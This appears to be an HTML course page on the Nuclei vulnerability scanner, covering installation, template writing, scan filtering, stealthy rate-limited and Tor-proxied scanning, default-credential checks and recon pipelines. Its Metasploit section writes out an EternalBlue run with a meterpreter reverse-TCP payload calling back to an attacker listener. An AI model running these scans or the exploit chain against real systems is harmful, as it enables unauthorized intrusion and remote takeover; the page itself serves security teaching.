@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nuclei — Cybersecurity Course</title>
+    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="Nuclei course — learn automated vulnerability scanning, template writing, and large-scale security testing.">
+</head>
+<body>
+
+<header>
+    <div class="logo">
+        <a href="index.html">BIT+</a>
+    </div>
+    <nav>
+        <a href="https://github.com/mu-b003" target="_blank">GitHub</a>
+        <a href="notes.html">Notes</a>
+    </nav>
+</header>
+
+<div class="ads-wrapper-layout">
+<div class="content-container">
+
+<details open>
+  <summary>Introduction — What is Nuclei?</summary>
+  <p>Nuclei is a fast, template-based vulnerability scanner developed by ProjectDiscovery. It sends targeted requests to targets based on YAML templates — each template checks for a specific vulnerability, misconfiguration, or exposed asset. With thousands of community templates covering CVEs, misconfigurations, exposed panels, and more, Nuclei is one of the most powerful tools in modern security testing.</p>
+  <h3>What Makes Nuclei Different?</h3>
+  <p>Unlike traditional scanners that use fixed signatures, Nuclei uses community-driven YAML templates — anyone can write, share, and use them. This means new vulnerabilities get templates within hours of disclosure.</p>
+  <h3>What Can Nuclei Do?</h3>
+  <p>Detect CVEs and known vulnerabilities — Find exposed admin panels — Discover misconfigurations — Identify default credentials — Detect exposed files and secrets — Perform network protocol scanning — DNS enumeration — SSL/TLS checks — Custom template-based checks.</p>
+  <h3>Nuclei vs Other Scanners</h3>
+  <pre>
+Nuclei       — Template-based, fast, community-driven
+               Best for: CVE scanning, bulk targets, custom checks
+
+Nessus       — Commercial, comprehensive, GUI
+               Best for: Enterprise compliance scanning
+
+OpenVAS      — Open-source Nessus alternative
+               Best for: Network vulnerability assessment
+
+Nikto        — Web-focused, older, noisy
+               Best for: Quick web server checks
+
+Burp Scanner — Deep web app testing, proxy-based
+               Best for: Manual + automated web app testing
+  </pre>
+  <h3>Installation</h3>
+  <pre>
+# Go install (recommended — always latest)
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+# Linux binary
+wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip
+unzip nuclei_linux_amd64.zip
+sudo mv nuclei /usr/local/bin/
+
+# macOS
+brew install nuclei
+
+# Kali Linux
+sudo apt install nuclei
+
+# Docker
+docker pull projectdiscovery/nuclei
+docker run projectdiscovery/nuclei -h
+
+# Update Nuclei and templates
+nuclei -update
+nuclei -update-templates
+
+# Check version
+nuclei -version
+  </pre>
+  <h3>Legal Warning</h3>
+  <p>Nuclei sends real HTTP requests and exploit attempts. Only scan targets you own or have explicit written permission to test. Unauthorized scanning is illegal and can cause unintended damage to production systems.</p>
+</details>
+
+<details>
+  <summary>Templates — The Core of Nuclei</summary>
+  <h3>What is a Template?</h3>
+  <p>A Nuclei template is a YAML file that defines exactly what request to send, what to look for in the response, and how to classify the finding. Templates are the heart of Nuclei — every scan you run is powered by them.</p>
+  <h3>Template Directory</h3>
+  <pre>
+# Templates are stored at:
+~/nuclei-templates/
+
+# Main categories:
+~/nuclei-templates/
+├── cves/              — CVE-specific exploits and detections
+│   ├── 2021/          — Organized by year
+│   ├── 2022/
+│   └── 2024/
+├── vulnerabilities/   — General vulnerability checks
+├── exposures/         — Exposed files, configs, panels
+│   ├── configs/       — Exposed config files
+│   ├── files/         — Sensitive file exposure
+│   └── logs/          — Exposed log files
+├── misconfigurations/ — Security misconfigurations
+├── default-logins/    — Default credential checks
+├── technologies/      — Technology detection
+├── network/           — Network protocol templates
+├── dns/               — DNS-related checks
+├── ssl/               — SSL/TLS checks
+├── fuzzing/           — Fuzzing templates
+├── helpers/           — Helper templates
+└── workflows/         — Multi-step workflow templates
+
+# Count total templates
+ls ~/nuclei-templates/**/*.yaml | wc -l
+  </pre>
+  <h3>Template Structure — Anatomy</h3>
+  <pre>
+id: example-vulnerability-check
+
+info:
+  name: Example Vulnerability Check
+  author: yourname
+  severity: high
+  description: Detects an example vulnerability.
+  tags: example,rce,cve
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerable/endpoint"
+
+    matchers:
+      - type: word
+        words:
+          - "vulnerable_string"
+        condition: and
+  </pre>
+  <h3>Severity Levels</h3>
+  <pre>
+critical   — Remote code execution, authentication bypass,
+             full system compromise
+high       — SQL injection, stored XSS, SSRF, significant data exposure
+medium     — Reflected XSS, CSRF, open redirect, info disclosure
+low        — Missing headers, verbose errors, minor misconfigs
+info       — Technology detection, version disclosure, interesting findings
+unknown    — Severity not yet determined
+  </pre>
+  <h3>Template Tags</h3>
+  <pre>
+Tags are used to filter which templates to run:
+
+cve          — CVE-identified vulnerabilities
+rce          — Remote code execution
+sqli         — SQL injection
+xss          — Cross-site scripting
+lfi          — Local file inclusion
+ssrf         — Server-side request forgery
+xxe          — XML external entity
+exposure     — Sensitive data exposure
+login-bypass — Authentication bypass
+default-login — Default credentials
+misconfig    — Misconfiguration
+panel        — Admin/login panel detection
+tech         — Technology fingerprinting
+wordpress    — WordPress-specific
+apache       — Apache-specific
+nginx        — Nginx-specific
+  </pre>
+</details>
+
+<details>
+  <summary>Basic Usage — Running Your First Scan</summary>
+  <h3>Basic Syntax</h3>
+  <pre>
+nuclei -u [target] [options]
+nuclei -l [targets-file] [options]
+  </pre>
+  <h3>Single Target Scan</h3>
+  <pre>
+# Scan a single URL with all default templates
+nuclei -u https://target.com
+
+# Scan with verbose output
+nuclei -u https://target.com -v
+  </pre>
+  <h3>Multiple Targets</h3>
+  <pre>
+# Scan a list of targets from a file
+nuclei -l targets.txt
+
+# targets.txt format:
+https://target1.com
+https://target2.com
+http://10.10.10.100
+https://api.target.com
+  </pre>
+  <h3>Understanding the Output</h3>
+  <pre>
+[timestamp] [template-id] [severity] [target-url]
+
+Examples:
+[2024-01-15 10:23:41] [CVE-2021-44228] [critical] [https://target.com/]
+[2024-01-15 10:23:45] [apache-detect] [info] [https://target.com/]
+[2024-01-15 10:23:48] [exposed-git-repo] [medium] [https://target.com/.git/]
+[2024-01-15 10:23:52] [default-login:admin/admin] [high] [https://target.com/admin]
+
+Color coding:
+Red       — Critical
+Orange    — High
+Yellow    — Medium
+Blue      — Low
+Cyan      — Info
+  </pre>
+  <h3>Update Templates Before Scanning</h3>
+  <pre>
+# Always update before a scan — new templates added daily
+nuclei -update-templates
+
+# Update nuclei binary too
+nuclei -update
+
+# Check template stats
+nuclei -tl           — List all templates
+nuclei -tl | wc -l   — Count total templates
+  </pre>
+</details>
+
+<details>
+  <summary>Target Specification</summary>
+  <h3>Single and Multiple Targets</h3>
+  <pre>
+# Single URL
+nuclei -u https://target.com
+
+# Multiple URLs on the command line
+nuclei -u https://target1.com -u https://target2.com
+
+# From a file
+nuclei -l urls.txt
+
+# From stdin (pipe from other tools)
+echo "https://target.com" | nuclei
+cat urls.txt | nuclei
+  </pre>
+  <h3>Combining with Other Tools</h3>
+  <pre>
+# Pipe from subfinder (subdomain discovery)
+subfinder -d target.com -silent | nuclei -t exposures/
+
+# Pipe from httpx (live host detection)
+subfinder -d target.com -silent | \
+httpx -silent | \
+nuclei -t cves/
+
+# Pipe from Nmap
+nmap -p 80,443 --open 192.168.1.0/24 -oG - | \
+awk '/open/{print $2}' | \
+nuclei -t network/
+
+# Pipe from katana (web crawler)
+katana -u https://target.com -silent | nuclei -t vulnerabilities/
+  </pre>
+  <h3>Scanning IP Ranges</h3>
+  <pre>
+# CIDR range
+nuclei -u 192.168.1.0/24
+
+# IP range in targets file
+cat > targets.txt << 'END'
+192.168.1.1
+192.168.1.2
+192.168.1.50
+10.0.0.1
+END
+nuclei -l targets.txt -t network/
+  </pre>
+  <h3>Scanning with Ports</h3>
+  <pre>
+# Specify custom ports
+nuclei -u https://target.com:8443
+nuclei -u http://target.com:8080
+
+# Mix HTTP and HTTPS
+cat > targets.txt << 'END'
+http://target.com:8080
+https://target.com:8443
+https://api.target.com
+END
+nuclei -l targets.txt
+  </pre>
+</details>
+
+<details>
+  <summary>Template Selection and Filtering</summary>
+  <h3>Run Specific Templates</h3>
+  <pre>
+# Run a single template
+nuclei -u https://target.com \
+       -t cves/2021/CVE-2021-44228.yaml
+
+# Run all templates in a directory
+nuclei -u https://target.com \
+       -t cves/
+
+# Run multiple specific directories
+nuclei -u https://target.com \
+       -t cves/ -t vulnerabilities/ -t exposures/
+
+# Run all default templates
+nuclei -u https://target.com
+  </pre>
+  <h3>Filter by Tags</h3>
+  <pre>
+# Run only templates with specific tags
+nuclei -u https://target.com -tags cve
+nuclei -u https://target.com -tags rce
+nuclei -u https://target.com -tags xss,sqli
+nuclei -u https://target.com -tags wordpress
+nuclei -u https://target.com -tags exposure,misconfig
+
+# Exclude specific tags
+nuclei -u https://target.com -etags dos
+nuclei -u https://target.com -etags fuzz,dos
+  </pre>
+  <h3>Filter by Severity</h3>
+  <pre>
+# Run only critical and high severity templates
+nuclei -u https://target.com -severity critical,high
+
+# Run everything except info
+nuclei -u https://target.com -severity critical,high,medium,low
+
+# Run only critical
+nuclei -u https://target.com -severity critical
+
+# Exclude a severity
+nuclei -u https://target.com -exclude-severity info
+  </pre>
+  <h3>Filter by Author or Template ID</h3>
+  <pre>
+# Run templates by a specific author
+nuclei -u https://target.com -author pdteam
+nuclei -u https://target.com -author geeknik
+
+# Run a specific template by ID
+nuclei -u https://target.com \
+       -id CVE-2021-44228
+nuclei -u https://target.com \
+       -id apache-detect,nginx-version
+
+# Exclude specific template IDs
+nuclei -u https://target.com \
+       -exclude-id CVE-2021-44228
+  </pre>
+  <h3>Technology-Specific Scanning</h3>
+  <pre>
+# Scan WordPress sites
+nuclei -u https://target.com -tags wordpress
+
+# Scan Apache servers
+nuclei -u https://target.com -tags apache
+
+# Scan for Confluence vulnerabilities
+nuclei -u https://target.com -tags confluence
+
+# Scan for Jira vulnerabilities
+nuclei -u https://target.com -tags jira
+
+# Scan for Jenkins
+nuclei -u https://target.com -tags jenkins
+
+# Scan for Citrix
+nuclei -u https://target.com -tags citrix
+
+# Scan for Exchange Server
+nuclei -u https://target.com -tags exchange
+  </pre>
+  <h3>Workflow Templates</h3>
+  <pre>
+# Workflows chain multiple templates logically
+# Only run follow-up templates if first one matched
+
+# Run a workflow
+nuclei -u https://target.com \
+       -w workflows/wordpress-workflow.yaml
+
+# Example: WordPress workflow first detects WP,
+# then runs WP-specific vulnerability templates only
+  </pre>
+</details>
+
+<details>
+  <summary>Rate Limiting, Performance, and Stealth</summary>
+  <h3>Controlling Request Rate</h3>
+  <pre>
+# Limit requests per second (default: 150)
+nuclei -u https://target.com -rate-limit 50
+
+# Very slow — stealthy scan
+nuclei -u https://target.com -rate-limit 5
+
+# Very fast — internal lab
+nuclei -u https://target.com -rate-limit 500
+
+# Set maximum bulk size (requests per host, default: 25)
+nuclei -u https://target.com -bulk-size 10
+
+# Set concurrency (parallel template executions, default: 25)
+nuclei -u https://target.com -c 10
+  </pre>
+  <h3>Timeout and Retry Settings</h3>
+  <pre>
+# Set request timeout in seconds (default: 10)
+nuclei -u https://target.com -timeout 5
+
+# Set number of retries (default: 1)
+nuclei -u https://target.com -retries 3
+
+# Set max host errors before skipping (default: 30)
+nuclei -u https://target.com -max-host-error 5
+  </pre>
+  <h3>Proxy Support</h3>
+  <pre>
+# Route through a proxy (Burp Suite)
+nuclei -u https://target.com \
+       -proxy http://127.0.0.1:8080
+
+# Route through SOCKS5 (Tor)
+nuclei -u https://target.com \
+       -proxy socks5://127.0.0.1:9050
+
+# Use a list of proxies (rotates automatically)
+nuclei -u https://target.com \
+       -proxy-list proxies.txt
+  </pre>
+  <h3>Header Customization</h3>
+  <pre>
+# Add a custom header to all requests
+nuclei -u https://target.com \
+       -H "X-Bug-Bounty: yourname@email.com"
+
+# Add authorization header
+nuclei -u https://target.com \
+       -H "Authorization: Bearer eyJhbGci..."
+
+# Add multiple headers
+nuclei -u https://target.com \
+       -H "Cookie: session=abc123" \
+       -H "X-Custom: value"
+  </pre>
+  <h3>Scanning Authenticated Areas</h3>
+  <pre>
+# Pass session cookies for authenticated scanning
+nuclei -u https://target.com \
+       -H "Cookie: PHPSESSID=abc123; auth=eyJ..."
+
+# Or use environment variable for headers file
+cat > headers.yaml << 'END'
+Cookie: session=abc123def456
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
+END
+
+nuclei -u https://target.com \
+       -header-file headers.yaml
+  </pre>
+</details>
+
+<details>
+  <summary>Output and Reporting</summary>
+  <h3>Output Formats</h3>
+  <pre>
+# Default output — colored terminal
+nuclei -u https://target.com
+
+# Save to plain text file
+nuclei -u https://target.com -o results.txt
+
+# JSON output (best for parsing and automation)
+nuclei -u https://target.com -json -o results.json
+
+# JSON lines format (one JSON object per line)
+nuclei -u https://target.com -jsonl -o results.jsonl
+
+# Markdown report
+nuclei -u https://target.com -markdown-export report/
+
+# SARIF format (for CI/CD integration)
+nuclei -u https://target.com -sarif-export results.sarif
+  </pre>
+  <h3>Verbosity Levels</h3>
+  <pre>
+# Default — show findings only
+nuclei -u https://target.com
+
+# Verbose — show requests sent
+nuclei -u https://target.com -v
+
+# Very verbose — show requests and responses
+nuclei -u https://target.com -vv
+
+# Silent — suppress all output except findings
+nuclei -u https://target.com -silent
+
+# Show statistics during scan
+nuclei -u https://target.com -stats
+
+# Show statistics with update interval
+nuclei -u https://target.com -stats -stats-interval 10
+  </pre>
+  <h3>Filtering Output</h3>
+  <pre>
+# Show only specific severity in output
+nuclei -u https://target.com \
+       -severity critical,high \
+       -o high_critical.txt
+
+# Hide info findings from output
+nuclei -u https://target.com \
+       -exclude-severity info
+
+# Show only specific tags in output
+nuclei -u https://target.com \
+       -tags cve -o cve_results.txt
+  </pre>
+  <h3>Parsing JSON Results</h3>
+  <pre>
+# Pretty print JSON results
+cat results.json | python3 -m json.tool
+
+# Extract template IDs and URLs
+cat results.jsonl | jq -r '[.["template-id"], .host] | @tsv'
+
+# Get all critical findings
+cat results.jsonl | jq 'select(.info.severity == "critical")'
+
+# Count findings by severity
+cat results.jsonl | jq -r '.info.severity' | sort | uniq -c
+
+# Get unique vulnerable URLs
+cat results.jsonl | jq -r '.host' | sort -u
+
+# Extract matched responses
+cat results.jsonl | jq -r '.["matched-at"]'
+  </pre>
+  <h3>Nuclei Dashboard — PDCP</h3>
+  <pre>
+# ProjectDiscovery Cloud Platform — free web dashboard
+# Upload results and get visual reports
+
+# Enable cloud reporting
+nuclei -u https://target.com \
+       -cloud-upload \
+       -api-key YOUR_PDCP_API_KEY
+
+# Get API key from: https://cloud.projectdiscovery.io
+  </pre>
+</details>
+
+<details>
+  <summary>Writing Custom Templates</summary>
+  <h3>Template Skeleton</h3>
+  <pre>
+id: my-custom-check
+
+info:
+  name: My Custom Vulnerability Check
+  author: yourname
+  severity: medium
+  description: |
+    Checks for a custom vulnerability condition.
+  tags: custom,exposure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/target/path"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "vulnerable_string"
+        part: body
+
+      - type: status
+        status:
+          - 200
+  </pre>
+  <h3>Template Variables</h3>
+  <pre>
+{{BaseURL}}      — Full base URL (https://target.com)
+{{RootURL}}      — Root URL without path
+{{Hostname}}     — Hostname only (target.com)
+{{Host}}         — Host with port if non-standard
+{{Port}}         — Port number
+{{Path}}         — URL path
+{{Scheme}}       — http or https
+{{Username}}     — Username (from -var)
+{{Password}}     — Password (from -var)
+  </pre>
+  <h3>Matcher Types</h3>
+  <pre>
+# Word matcher — check for strings
+matchers:
+  - type: word
+    words:
+      - "root:x:0:0"
+      - "daemon:"
+    condition: or      — any word matches (default)
+    # condition: and   — all words must match
+    part: body         — where to match: body/header/all/response
+
+# Regex matcher
+matchers:
+  - type: regex
+    regex:
+      - "([a-zA-Z0-9]{32})"          — 32-char hash
+      - "password\\s*=\\s*['\"][^'\"]+['\"]"  — password in config
+
+# Status code matcher
+matchers:
+  - type: status
+    status:
+      - 200
+      - 301
+
+# Size matcher
+matchers:
+  - type: size
+    size:
+      - 1234          — Exact size match
+
+# Binary matcher
+matchers:
+  - type: binary
+    binary:
+      - "504B0304"    — ZIP file magic bytes (hex)
+
+# DSL matcher — complex logic expressions
+matchers:
+  - type: dsl
+    dsl:
+      - "status_code == 200 && len(body) > 100"
+      - "contains(header, 'X-Powered-By')"
+  </pre>
+  <h3>Extractor Types</h3>
+  <pre>
+# Extract data from responses
+extractors:
+  - type: regex
+    name: version
+    regex:
+      - "Apache/([0-9.]+)"
+    group: 1           — capture group number
+
+  - type: kval
+    kval:
+      - server         — extract Server header value
+
+  - type: xpath
+    xpath:
+      - "//title"      — extract page title
+
+  - type: json
+    json:
+      - ".version"     — extract JSON field
+
+  - type: dsl
+    dsl:
+      - "header"       — extract entire header
+  </pre>
+  <h3>POST Request Template</h3>
+  <pre>
+id: login-default-credentials
+
+info:
+  name: Default Login — admin/admin
+  author: yourname
+  severity: high
+  tags: default-login,panel
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin/login"
+      - "{{BaseURL}}/login"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "username=admin&password=admin"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "dashboard"
+          - "logout"
+          - "welcome"
+        condition: or
+        part: body
+
+      - type: status
+        status:
+          - 200
+          - 302
+  </pre>
+  <h3>Multi-Request Template</h3>
+  <pre>
+id: multi-step-check
+
+info:
+  name: Multi-Step Vulnerability Check
+  author: yourname
+  severity: high
+
+requests:
+  # Request 1 — Get CSRF token
+  - method: GET
+    path:
+      - "{{BaseURL}}/login"
+
+    extractors:
+      - type: regex
+        name: csrf_token
+        regex:
+          - 'name="csrf" value="([a-f0-9]+)"'
+        group: 1
+        internal: true   — store for use in next request
+
+  # Request 2 — Submit with extracted token
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+
+    body: "username=admin&password=admin&csrf={{csrf_token}}"
+
+    matchers:
+      - type: word
+        words:
+          - "welcome admin"
+        part: body
+  </pre>
+  <h3>Network Template (Non-HTTP)</h3>
+  <pre>
+id: redis-unauth
+
+info:
+  name: Redis Unauthenticated Access
+  author: yourname
+  severity: critical
+  tags: redis,network,unauth
+
+network:
+  - inputs:
+      - data: "PING\r\n"
+
+    host:
+      - "{{Hostname}}:6379"
+
+    read-size: 2048
+
+    matchers:
+      - type: word
+        words:
+          - "+PONG"
+  </pre>
+  <h3>Testing Your Template</h3>
+  <pre>
+# Test a template against a target
+nuclei -u https://target.com \
+       -t /path/to/my-template.yaml \
+       -v
+
+# Validate template syntax
+nuclei -validate -t my-template.yaml
+
+# Debug mode — show full request/response
+nuclei -u https://target.com \
+       -t my-template.yaml \
+       -debug
+
+# Test with a specific variable
+nuclei -u https://target.com \
+       -t my-template.yaml \
+       -var username=admin \
+       -var password=password123
+  </pre>
+</details>
+
+<details>
+  <summary>Real-World Scanning Examples</summary>
+  <h3>CVE Scanning</h3>
+  <pre>
+# Scan for all CVEs
+nuclei -u https://target.com -t cves/ -c 20
+
+# Scan for a specific year's CVEs
+nuclei -u https://target.com -t cves/2023/
+nuclei -u https://target.com -t cves/2024/
+
+# Scan for critical CVEs only
+nuclei -u https://target.com \
+       -t cves/ \
+       -severity critical
+
+# Famous CVEs with dedicated templates:
+nuclei -u https://target.com -id CVE-2021-44228  — Log4Shell
+nuclei -u https://target.com -id CVE-2022-22965  — Spring4Shell
+nuclei -u https://target.com -id CVE-2021-26855  — Exchange ProxyLogon
+nuclei -u https://target.com -id CVE-2020-1472   — ZeroLogon
+nuclei -u https://target.com -id CVE-2023-44487  — HTTP/2 Rapid Reset
+  </pre>
+  <h3>Exposed Panels and Admin Interfaces</h3>
+  <pre>
+# Find exposed admin panels
+nuclei -u https://target.com \
+       -t exposures/panels/ \
+       -severity info,low,medium
+
+# Find exposed configuration files
+nuclei -u https://target.com \
+       -t exposures/configs/
+
+# Find exposed log files
+nuclei -u https://target.com \
+       -t exposures/logs/
+
+# Find exposed APIs
+nuclei -u https://target.com \
+       -t exposures/apis/
+
+# Find .git and .svn repos
+nuclei -u https://target.com \
+       -t exposures/files/
+  </pre>
+  <h3>Default Credentials Scan</h3>
+  <pre>
+# Test default credentials on all services
+nuclei -u https://target.com \
+       -t default-logins/
+
+# Specific service default logins
+nuclei -u https://target.com \
+       -t default-logins/ssh/
+nuclei -u https://target.com \
+       -t default-logins/http/
+nuclei -u https://target.com \
+       -t default-logins/ftp/
+
+# Common default login templates:
+# default-logins/jenkins/jenkins-default-login.yaml
+# default-logins/grafana/grafana-default-login.yaml
+# default-logins/tomcat/tomcat-default-login.yaml
+# default-logins/mongodb/mongodb-unauth.yaml
+  </pre>
+  <h3>Technology Detection</h3>
+  <pre>
+# Detect what technologies a site uses
+nuclei -u https://target.com \
+       -t technologies/ \
+       -severity info
+
+# Detect CMS
+nuclei -u https://target.com \
+       -tags tech,wordpress,joomla,drupal
+
+# Detect web frameworks
+nuclei -u https://target.com \
+       -tags laravel,django,rails,spring
+
+# Detect cloud infrastructure
+nuclei -u https://target.com \
+       -tags aws,gcp,azure
+  </pre>
+  <h3>Misconfiguration Detection</h3>
+  <pre>
+# Find common misconfigurations
+nuclei -u https://target.com \
+       -t misconfigurations/
+
+# Specific checks:
+nuclei -u https://target.com \
+       -t misconfigurations/cors/    — CORS misconfig
+
+nuclei -u https://target.com \
+       -t misconfigurations/http-missing-security-headers.yaml
+
+nuclei -u https://target.com \
+       -t misconfigurations/clickjacking.yaml
+
+# SSL/TLS checks
+nuclei -u https://target.com \
+       -t ssl/
+  </pre>
+  <h3>Bug Bounty Workflow</h3>
+  <pre>
+# Step 1 — Discover subdomains
+subfinder -d target.com -silent > subs.txt
+
+# Step 2 — Check which are alive
+httpx -l subs.txt -silent > alive.txt
+
+# Step 3 — Run Nuclei on all alive hosts
+nuclei -l alive.txt \
+       -t cves/ \
+       -t vulnerabilities/ \
+       -t exposures/ \
+       -t misconfigurations/ \
+       -t default-logins/ \
+       -severity critical,high,medium \
+       -c 30 \
+       -rate-limit 100 \
+       -json \
+       -o bb_results.jsonl \
+       -stats
+
+# Step 4 — Sort by severity
+cat bb_results.jsonl | \
+jq 'select(.info.severity == "critical")' > critical.jsonl
+  </pre>
+  <h3>Internal Network Scanning</h3>
+  <pre>
+# Scan internal network for vulnerabilities
+nuclei -l internal_hosts.txt \
+       -t network/ \
+       -t default-logins/ \
+       -t misconfigurations/ \
+       -severity critical,high \
+       -c 50 \
+       -rate-limit 200 \
+       -o internal_scan.json \
+       -json
+
+# Scan for common network service issues
+nuclei -l hosts.txt \
+       -tags redis,mongodb,elasticsearch,memcached \
+       -severity critical,high
+  </pre>
+</details>
+
+<details>
+  <summary>Integration with Other Tools</summary>
+  <h3>ProjectDiscovery Ecosystem</h3>
+  <p>Nuclei is part of the ProjectDiscovery toolkit — each tool feeds the next in a powerful pipeline.</p>
+  <pre>
+subfinder   — Subdomain discovery
+httpx       — HTTP probing and tech detection
+katana      — Web crawling and spidering
+nuclei      — Vulnerability scanning
+notify      — Send alerts to Slack/Discord/Telegram
+  </pre>
+  <h3>Full Recon Pipeline</h3>
+  <pre>
+# Complete automated recon and scan pipeline
+subfinder -d target.com -silent | \
+httpx -silent -title -tech-detect -status-code | \
+tee alive_with_tech.txt | \
+awk '{print $1}' | \
+nuclei -t cves/ -t exposures/ -t misconfigurations/ \
+       -severity critical,high,medium \
+       -json -o pipeline_results.jsonl \
+       -stats
+  </pre>
+  <h3>Notify — Send Alerts</h3>
+  <pre>
+# Install notify
+go install github.com/projectdiscovery/notify/cmd/notify@latest
+
+# Configure notify (~/.config/notify/provider-config.yaml)
+slack:
+  - id: "bugs"
+    slack_channel: "#security-alerts"
+    slack_username: "Nuclei Bot"
+    slack_webhook_url: "https://hooks.slack.com/services/..."
+
+discord:
+  - id: "disc"
+    discord_channel: "nuclei"
+    discord_webhook_url: "https://discord.com/api/webhooks/..."
+
+# Pipe nuclei output to notify
+nuclei -l targets.txt \
+       -severity critical,high \
+       -silent | \
+notify -provider slack -id bugs
+  </pre>
+  <h3>CI/CD Integration</h3>
+  <pre>
+# GitHub Actions workflow example
+# .github/workflows/nuclei-scan.yml
+
+name: Security Scan
+on: [push, pull_request]
+
+jobs:
+  nuclei:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run Nuclei
+        uses: projectdiscovery/nuclei-action@main
+        with:
+          target: https://staging.target.com
+          flags: -severity critical,high
+          output: nuclei_output.txt
+
+      - name: Upload Results
+        uses: actions/upload-artifact@v3
+        with:
+          name: nuclei-results
+          path: nuclei_output.txt
+
+# SARIF output for GitHub Security tab
+nuclei -u https://target.com \
+       -sarif-export results.sarif
+  </pre>
+  <h3>Integration with Metasploit</h3>
+  <pre>
+# Use Nuclei to find vulnerabilities, then exploit with Metasploit
+
+# Step 1 — Find EternalBlue candidates
+nuclei -l hosts.txt \
+       -id CVE-2017-0144 \
+       -json -o eternalblue.jsonl
+
+# Step 2 — Extract vulnerable hosts
+cat eternalblue.jsonl | \
+jq -r '.host' | \
+sed 's|http://||;s|:.*||' > vuln_hosts.txt
+
+# Step 3 — Launch Metasploit against confirmed targets
+msfconsole -q -r << 'MSF'
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS file:/tmp/vuln_hosts.txt
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.10.5
+run
+MSF
+  </pre>
+</details>
+
+<details>
+  <summary>Nuclei Cheat Sheet</summary>
+  <h3>Core Options</h3>
+  <pre>
+-u URL          — Single target URL
+-l file         — Targets from file
+-t path         — Template or directory
+-id template-id — Run specific template by ID
+-w workflow     — Run workflow template
+-update         — Update Nuclei binary
+-update-templates — Update template library
+-tl             — List all templates
+-version        — Show version
+  </pre>
+  <h3>Filtering Options</h3>
+  <pre>
+-tags tags      — Filter by tags (cve,rce,xss...)
+-etags tags     — Exclude tags
+-severity lvl   — Filter by severity (critical,high,medium,low,info)
+-exclude-severity — Exclude severity levels
+-author name    — Filter by template author
+-id ID          — Filter by template ID
+-exclude-id ID  — Exclude template ID
+  </pre>
+  <h3>Performance Options</h3>
+  <pre>
+-c N            — Concurrency (default: 25)
+-rate-limit N   — Requests per second (default: 150)
+-bulk-size N    — Requests per host (default: 25)
+-timeout N      — Request timeout in seconds (default: 10)
+-retries N      — Retry failed requests (default: 1)
+-max-host-error N — Skip host after N errors (default: 30)
+-p N            — Delay between requests
+  </pre>
+  <h3>Request Options</h3>
+  <pre>
+-H "Header"     — Custom HTTP header
+-proxy URL      — HTTP/SOCKS5 proxy
+-proxy-list     — Proxy list file
+-var key=val    — Template variable
+-header-file    — Headers from YAML file
+  </pre>
+  <h3>Output Options</h3>
+  <pre>
+-o file         — Output to file
+-json           — JSON output format
+-jsonl          — JSON lines format
+-markdown-export — Markdown report folder
+-sarif-export   — SARIF output file
+-v              — Verbose
+-vv             — Very verbose
+-silent         — Results only
+-stats          — Show statistics
+-nc             — No color
+  </pre>
+  <h3>Most Used Commands</h3>
+  <pre>
+# Quick CVE scan
+nuclei -u https://target.com -t cves/ -severity critical,high -c 20
+
+# Full scan
+nuclei -u https://target.com -t cves/ -t vulnerabilities/ \
+       -t exposures/ -t misconfigurations/ -c 30 -o results.txt
+
+# Bulk scan from file
+nuclei -l targets.txt -t cves/ -json -o results.jsonl -stats
+
+# Technology detection
+nuclei -u https://target.com -t technologies/ -severity info
+
+# Default credential scan
+nuclei -u https://target.com -t default-logins/
+
+# Stealth scan
+nuclei -u https://target.com -rate-limit 10 -t 5 -c 5
+
+# Bug bounty pipeline
+subfinder -d target.com -silent | httpx -silent | \
+nuclei -t cves/ -t exposures/ -severity critical,high \
+       -json -o bb_results.jsonl
+
+# Validate custom template
+nuclei -validate -t my-template.yaml
+
+# Debug custom template
+nuclei -u https://target.com -t my-template.yaml -debug
+  </pre>
+  <h3>Key Template Directories</h3>
+  <pre>
+~/nuclei-templates/cves/              — CVE checks
+~/nuclei-templates/vulnerabilities/   — General vulns
+~/nuclei-templates/exposures/         — Exposed files/panels
+~/nuclei-templates/misconfigurations/ — Misconfigs
+~/nuclei-templates/default-logins/    — Default creds
+~/nuclei-templates/technologies/      — Tech detection
+~/nuclei-templates/network/           — Network protocols
+~/nuclei-templates/ssl/               — SSL/TLS checks
+~/nuclei-templates/dns/               — DNS checks
+~/nuclei-templates/workflows/         — Multi-step workflows
+  </pre>
+</details>
+
+</div>
+</div>
+
+<footer class="site-footer">
+    <div class="footer-container">
+        <div class="footer-right">
+            <span>BIT+ Platform</span>
+            <span>|</span>
+            <span>&copy; 2026 All rights reserved.</span>
+        </div>
+        <div class="footer-left">
+            <a href="about.html">About Us</a>
+            <a href="privacy-policy.html">Privacy Policy</a>
+            <a href="contact.html">Contact Us</a>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
